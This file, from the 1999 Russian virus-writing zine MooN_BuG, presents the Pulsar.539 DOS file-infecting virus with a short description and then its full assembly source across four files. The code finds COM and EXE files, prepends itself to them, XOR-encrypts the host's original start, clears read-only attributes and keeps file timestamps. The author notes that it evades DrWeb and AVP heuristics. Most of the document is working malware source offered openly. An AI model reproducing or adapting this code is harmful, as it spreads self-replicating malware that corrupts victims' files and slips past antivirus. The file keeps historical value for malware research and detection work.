@@ -1,0 +1,324 @@
+[TulaAnti&ViralClub] PRESENTS ...
+MooN_BuG, Issue 10, Apr 1999                                          file 00D
+
+                               Вирус Pulsar.539
+                                                        by RedArc
+
+     Нерезидентный  вирус.  Инфицирует  COM  и EXE файлы в текущем каталоге по
+методу  вирусов  типа  HLLP:  инфицирует в начало, а старое начало переносит в
+конец  файла,  предварительно  его  зашифровав. Инфицирует только файлы, длина
+которых   не  кратна  2.  Соответственно,  после  инфицирования,  длина  файла
+становится  кратна  2. Перед запуском жертвы, вирус ее предварительно лечит на
+диске  и исполняет через функцию Exec. Инфицирует файлы с атрибутами ReadOnly.
+Сохраняет  время  и  атрибуты. Инфицирует файлы, длина которых не меньше длины
+самого  вируса  и  не более 65535 байт, однако после инфицирования длина файла
+может превышать 65535 байт (что ни есть хорошо).
+     В  общем,  в  этом вирусе нет ничего примечательного за исключением того,
+что  вирусы  подобного  типа  не  ловятся  эвристиками DrWeb и AVP. Как это ни
+странно ;)
+
+=== Cut ===                                                         Pulsar.asm
+Model Tiny
+.486
+.code
+org 100h
+start:
+; подготовка для передачи управления программе-жертве
+       cmp subprocname[0],0
+       je EndStart
+       lea dx,subprocname
+       xchg cx,ax
+       call SetFileAttr
+       call OpenFile
+       xor ax,ax
+       call DataTimeFile
+       mov word ptr ds:Temp[0],cx
+       mov word ptr ds:Temp[2],dx
+       call MoveHandle2End
+       call ReadFromFile
+       call MoveHandle2End
+       mov ax,ProgLength
+       mov cx,MyLength
+       lea dx,MainBuff
+       call XorBuff1
+       xor cx,cx
+       xor dx,dx
+       call Write2File
+       mov ProgLength,0
+       call MoveHandle2End
+       lea dx,MainBuff
+       mov cx,MyLength
+       call Write2File
+       mov cx,word ptr ds:Temp[0]
+       mov dx,word ptr ds:Temp[2]
+       mov word ptr ds:[96h],cx
+       mov word ptr ds:[98h],dx
+       call CloseFile
+; исполнение программы-жертвы
+       mov ax,400h
+       mov bx,400h
+       call Memory
+       jc EndStart
+       lea di,EPB
+       call MakeEPB
+       lea di,_stack
+       lea dx,subprocname
+       lea bx,EPB
+       call Exec
+EndStart:
+       mov bx,0ffffh
+EStart:
+       mov ax,0fffeh
+       call Memory
+       jc EStart
+;---
+; создаем маску для поиска EXE-файлов
+       mov subprocname [0],'*'
+       mov subprocname [1],'.'
+       mov subprocname [2],'e'
+       mov subprocname [3],'x'
+       mov subprocname [4],'e'
+       mov subprocname [5],0
+       call FindFile
+; создаем маску для поиска COM-файлов
+       mov subprocname [0],'*'
+       mov subprocname [1],'.'
+       mov subprocname [2],'c'
+       mov subprocname [3],'o'
+       mov subprocname [4],'m'
+       mov subprocname [5],0
+       call FindFile
+       mov ax,4c00h
+       int 21h
+;---
+FindFile:
+; поиск первого файла
+       mov ah,4eh
+       lea dx,subprocname
+       mov cx,0ffh
+Interrupt:
+       int 21h
+       jnb TestFile
+       ret
+; файл найден, нужно проверить на заражение
+TestFile:
+       mov si,9eh
+       lea di,subprocname
+       xor cx,cx
+       mov ax,cx
+       cld
+; устанавливаем имя найденного файла
+TestName:
+       lodsb
+       stosb
+       inc cx
+       cmp al,ah
+       je NameOk
+       cmp cx,13
+       jne TestName
+BadName:
+       mov ah,4fh
+       jmp short Interrupt
+NameOk:
+; проверяем длину инфицированного файла
+       mov bx,word ptr ds:[9ah]
+       cmp bx,MyLength
+       jle BadName
+       mov ax,word ptr ds:[9ch]
+       cmp ax,0
+       jne BadName
+       mov ax,bx
+       shr ax,1
+       jnc BadName
+       mov ProgLength,bx
+       lea dx,subprocname
+       xor cx,cx
+       call SetFileAttr
+       call OpenFile
+       call ReadFromFile
+       call MoveHandle2End
+       lea dx,MainBuff
+       mov cx,MyLength
+       push cx
+       call XorBuff
+       call Write2File
+       mov ax,4200h
+       xor cx,cx
+       xor dx,dx
+       int 21h
+       xor dx,dx
+       pop cx
+       inc dh
+       call Write2File
+       call CloseFile
+       lea dx,subprocname
+       xor cx,cx
+       mov cl,byte ptr ds:[95h]
+       call SetFileAttr
+       jmp short BadName
+;---
+db 'R' xor 0adh, 'e' xor 0adh, 'd' xor 0adh, 'A' xor 0adh, 'r' xor 0adh, 'c' xor 0adh
+db 01h
+include subrout1.inc
+include subrout2.inc
+include daten.inc
+MyLength equ $-start
+MainBuff label byte
+end start
+=== Cut ===
+
+=== Cut ===                                                       subrout1.inc
+; БИБЛИОТЕКА ПОДПРОГРАММ
+
+;-----------------------------------------------------------------------------
+;Intro:   Выполнить внешнюю программу
+;Input:   DS:DX - имя программы
+;         ES:BX - блок параметров для запуска подпроцесса
+;         CS:DI - место для хранения переменных в формате dd
+;Output:  AX - код ошибки, если установлен CF
+;Destroy: все регистры
+Exec:
+      mov    ax,4b00h
+      push   ds es
+      mov    word ptr cs:[di],ss
+      mov    word ptr cs:[di+2],sp
+      mov    DI_SAVE,di
+      int    21h
+      mov    di,DI_SAVE
+      cli
+      mov    sp,cs:[di+2]
+      mov    ss,cs:[di]
+      sti
+      pop    es ds
+      mov dx,80h
+      mov ah,1ah
+      int 21h
+      ret
+DI_SAVE dw ?
+;-----------------------------------------------------------------------------
+;Intro:   Изменение блока доступной памяти
+;Input:   AX - оставляемый размер стека
+;         ES - распределяемый блок
+;         BX - желаемый размер блока
+;Output:  AX - код ошибки, если установлен CF
+;Destroy: DI
+Memory:
+      pop    di
+      mov    sp,ax
+      mov    ah,4ah
+      int    21h
+      jmp    di
+;-----------------------------------------------------------------------------
+;Intro:   Подготовка блока параметров для запуска
+;Input:   DS:DI - блок параметров
+;Output:  none
+;Destroy: none
+MakeEPB:
+      mov word ptr ds:[di+4],es
+      mov word ptr ds:[di+8],es
+      mov word ptr ds:[di+12],es
+      ret
+;-----------------------------------------------------------------------------
+=== Cut ===
+
+=== Cut ===                                                       subrout2.inc
+; БИБЛИОТЕКА ПОДПРОГРАММ
+
+;-----------------------------------------------------------------------------
+OpenFile:
+       mov ax,3d02h
+       int 21h
+       xchg bx,ax
+       ret
+;-----------------------------------------------------------------------------
+MoveHandle2End:
+       mov ax,4200h
+       cwd
+       mov cx,ProgLength
+       xchg cx,dx
+       int 21h
+       ret
+;-----------------------------------------------------------------------------
+Write2File:
+       mov ah,40h
+       int 21h
+       ret
+;-----------------------------------------------------------------------------
+ReadFromFile:
+       mov ah,3fh
+       lea dx,MainBuff
+       mov cx,MyLength
+       int 21h
+       ret
+;-----------------------------------------------------------------------------
+CloseFile:
+       mov al,01h
+       mov cx,word ptr ds:[96h]
+       mov dx,word ptr ds:[98h]
+       call DataTimeFile
+       mov ah,3eh
+       int 21h
+       ret
+;-----------------------------------------------------------------------------
+SetFileAttr:
+       mov ax,4301h
+       int 21h
+       ret
+;-----------------------------------------------------------------------------
+DataTimeFile:
+       mov ah,57h
+       int 21h
+       ret
+;-----------------------------------------------------------------------------
+XorBuff:
+       mov di,dx
+       mov si,dx
+       push cx
+XB:
+       lodsb
+       xor al,ah
+       add al,cl
+       stosb
+       loop XB
+       pop cx
+       ret
+;-----------------------------------------------------------------------------
+XorBuff1:
+       mov di,dx
+       mov si,dx
+       push cx
+XB1:
+       lodsb
+       sub al,cl
+       xor al,ah
+       stosb
+       loop XB1
+       pop cx
+       ret
+;-----------------------------------------------------------------------------
+=== Cut ===
+
+=== Cut ===                                                          daten.inc
+;-----------------------------------------------------------------------------
+ProgLength dw ?
+;-----------------------------------------------------------------------------
+; имя программы для запуска
+subprocname db 12 dup (?)
+            db 0h
+;-----------------------------------------------------------------------------
+; блок параметров exec
+EPB label byte
+      _seg      dw      00h
+                dw      80h
+      _segCMD   dw      00h
+                dw      5ch
+      _segFCB1  dw      00h
+                dw      6ch
+      _segFCB2  dw      00h
+;-----------------------------------------------------------------------------
+; внутренний стек
+      _stack    dw      00h
+      _stackp   dw      00h
+;-----------------------------------------------------------------------------
+Temp dd ?
+=== Cut ===
